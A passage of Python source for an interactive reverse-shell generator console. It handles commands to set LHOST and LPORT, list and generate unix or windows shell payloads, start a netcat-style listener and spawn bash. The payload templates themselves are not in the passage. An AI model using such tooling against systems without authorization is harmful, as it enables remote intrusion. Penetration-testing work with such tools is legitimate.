                print(f"  {C.r('Usage: ! <command>')}")
            continue

        try:
            parts = shlex.split(raw)
        except ValueError as e:
            print(C.r(f"  Parse error: {e}"))
            continue

        cmd  = parts[0].lower()
        args = parts[1:]

        # ── exit ──────────────────────────────────────────────────────────
        if cmd in ("exit", "quit"):
            print(f"\n  {C.grey('Goodbye.')}\n")
            break

        # ── help ──────────────────────────────────────────────────────────
        elif cmd == "help":
            print(HELP)

        # ── clear ─────────────────────────────────────────────────────────
        elif cmd == "clear":
            print("\033[2J\033[H", end="")
            print(BANNER)

        # ── shell ─────────────────────────────────────────────────────────
        elif cmd == "shell":
            print(f"\n  {C.grey('Dropping into /bin/bash  (exit to return)')}\n")
            try:
                subprocess.run(["/bin/bash"])
            except Exception as e:
                print(C.r(f"  {e}"))

        # ── load config ───────────────────────────────────────────────────
        elif cmd == "load":
            if len(args) != 1 or args[0].lower() != "config":
                print(f"  {C.r('Usage: load config')}")
            else:
                config = load_config()
                param  = config.get("param", {})
                host   = param.get("host", "")
                port   = param.get("port", "")
                if host:
                    session.lhost = host
                    print(f"  LHOST  {C.grey('=>')}  {C.g(host)}")
                else:
                    print(f"  {C.grey('LHOST not set in config.')}")
                if port:
                    session.lport = port
                    print(f"  LPORT  {C.grey('=>')}  {C.g(port)}")
                else:
                    print(f"  {C.grey('LPORT not set in config.')}")

        # ── set ───────────────────────────────────────────────────────────
        elif cmd == "set":
            if len(args) < 2:
                print(f"  {C.r('Usage: set <ip|port> <value|iface>')}")
            else:
                ok, resolved = session.set(args[0], args[1])
                if ok:
                    label = "LHOST" if args[0].lower() in ("ip","host","lhost") else "LPORT"
                    display = resolved if resolved else args[1]
                    extra   = f"  {C.grey('(from interface ' + args[1] + ')')}" if resolved else ""
                    print(f"  {label}  {C.grey('=>')}  {C.g(display)}{extra}")
                    if label == "LHOST":
                        change_config(host=display)
                    else:
                        change_config(port=display)
                else:
                    if args[0].lower() in ("ip","host","lhost") and is_interface_name(args[1]):
                        print(f"  {C.r(f"Interface '{args[1]}' not found.")}")
                        print(f"  {C.grey('Run')} ifconfig {C.grey('to list available interfaces.')}")
                    else:
                        print(f"  {C.r(f"Unknown key: '{args[0]}' (ip, port)")}")

        # ── unset ─────────────────────────────────────────────────────────
        elif cmd == "unset":
            if not args:
                print(f"  {C.r('Usage: unset <ip|port>')}")
            else:
                k = args[0].lower()
                if k in ("ip","host","lhost"):
                    session.lhost = None
                    change_config(host="")
                    print(f"  {C.grey('LHOST cleared.')}")
                elif k in ("port","lport"):
                    session.lport = None
                    change_config(port="")
                    print(f"  {C.grey('LPORT cleared.')}")
                else:
                    print(f"  {C.r(f"Unknown key: '{args[0]}'")}")

        # ── show ──────────────────────────────────────────────────────────
        elif cmd == "show":
            sub = args[0].lower() if args else ""
            if sub == "options":
                h = C.g(session.lhost) if session.lhost else C.r("not set")
                p = C.g(session.lport) if session.lport else C.r("not set")
                print(f"\n  LHOST  {C.grey('=>')}  {h}")
                print(f"  LPORT  {C.grey('=>')}  {p}\n")
            elif sub in CATEGORIES:
                print_payload_list(cat_filter=sub)
            elif sub in ("payloads", "shells", ""):
                print_payload_list()
            else:
                print(f"  {C.r(f"Unknown option: '{sub}'")}")

        # ── ifconfig / interfaces ─────────────────────────────────────────
        elif cmd in ("ifconfig", "interfaces"):
            sub = args[0].lower() if args else ""
            ifaces = get_interfaces()
            if sub == "pick":
                interactive_iface_picker(session)
            elif sub and sub in ifaces:
                print_interfaces(highlight=sub)
            else:
                print_interfaces()
                print(f"  {C.grey('Tip:')} ifconfig pick {C.grey('to set LHOST interactively')}\n")

        # ── use ───────────────────────────────────────────────────────────
        elif cmd == "use":
            if not args:
                print(f"  {C.r("Usage: use <key>  —  run 'show' to list keys")}")
            else:
                key = args[0].lower()
                if key in PAYLOAD_MAP:
                    print_single_payload(PAYLOAD_MAP[key], session)
                else:
                    print(f"  {C.r(f"Unknown payload: '{args[0]}'")}")

        # ── run / generate ────────────────────────────────────────────────
        elif cmd in ("run", "generate"):
            platform_filter: Optional[str] = None
            cat_filter: Optional[str]      = None
            remaining: list[str]           = []
            i = 0
            while i < len(args):
                a = args[i]
                if a in ("--unix", "-u"):
                    platform_filter = "unix"
                elif a in ("--windows", "-w"):
                    platform_filter = "windows"
                elif a in ("--cat", "-c") and i + 1 < len(args):
                    cat_filter = args[i + 1].lower()
                    i += 1
                else:
                    remaining.append(a)
                i += 1
            if remaining:
                key = remaining[0].lower()
                if key in PAYLOAD_MAP:
                    print_single_payload(PAYLOAD_MAP[key], session)
                else:
                    print(f"  {C.r(f"Unknown payload: '{remaining[0]}'")}")
            else:
                print_all_payloads(session, platform_filter, cat_filter)

        # ── listener ──────────────────────────────────────────────────────
        elif cmd == "listener":
            if not session.lport:
                print(f"  {C.r('LPORT not set — set port <port>')}")
            else:
                start_listener(session.lport, use_rlwrap=False)

        # ── rlwrap ────────────────────────────────────────────────────────
        elif cmd == "rlwrap":
            if not session.lport:
                print(f"  {C.r('LPORT not set — set port <port>')}")
            else:
                start_listener(session.lport, use_rlwrap=True)

        # ── unknown ───────────────────────────────────────────────────────
        else:
            print(f"  {C.r(f"Unknown command: '{cmd}'")}")
            print(f"  {C.grey('Type')} help {C.grey('for available commands.')}")


if __name__ == "__main__":
    run_console()